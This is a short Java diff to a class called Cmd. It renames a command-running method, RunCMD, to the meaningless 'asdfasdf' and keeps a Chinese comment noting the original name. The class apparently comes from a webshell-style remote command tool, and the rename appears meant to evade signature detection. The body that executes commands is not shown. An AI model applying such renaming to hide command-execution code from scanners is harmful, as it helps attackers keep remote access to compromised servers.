@@ -37,7 +37,7 @@ public class Cmd {
         HashMap result = new HashMap();
 
         try {
-            result.put("msg", this.RunCMD(cmd));
+            result.put("msg", this.asdfasdf(cmd));
             result.put("status", "success");
         } catch (Exception var13) {
             result.put("msg", var13.getMessage());
@@ -58,7 +58,8 @@ public class Cmd {
         return true;
     }
 
-    private String RunCMD(String cmd) throws Exception {
+    //原来的RunCMD方法
+    private String asdfasdf(String cmd) throws Exception {
         Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
         String result = "";
         if (cmd != null && cmd.length() > 0) {
